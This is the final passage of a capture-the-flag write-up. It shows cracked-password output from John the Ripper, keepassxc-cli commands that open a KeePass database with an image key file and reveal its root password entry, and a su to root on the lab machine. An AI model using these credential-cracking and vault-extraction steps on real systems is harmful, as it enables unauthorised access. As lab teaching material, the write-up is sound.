1g 0:00:00:03 DONE (2022-11-20 06:55) 0.3236g/s 333.9p/s 333.9c/s 333.9C/s bullshit..harold
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can finally open up the Keepass database `MyPasswords.kdbx` using `keepassxc-cli`. You can get it [here](https://keepassxc.org/download/#linux).

Listing out all entries in the database:
```console
$ keepassxc-cli ls -k images/IMG_0547.JPG MyPasswords.kdbx 
Enter password to unlock MyPasswords.kdbx: 
Root password
General/
Windows/
Network/
Internet/
eMail/
Homebanking/
Recycle Bin/
```

Viewing the "Root password" entry:
```console
$ keepassxc-cli show -sa password -k images/IMG_0547.JPG MyPasswords.kdbx "Root password"

[REDACTED]
```

Then I copied the password and pasted it in the box:
```console
user@safe:~$ su root
Password: 
root@safe:/home/user# 
```

## We are now `root@safe`

The ***root flag*** is at `/root/root.txt`.

### Done!

I really learnt alot about buffer overflow in this challenge. It was quite hard for me, but fun and challenging at the same time.
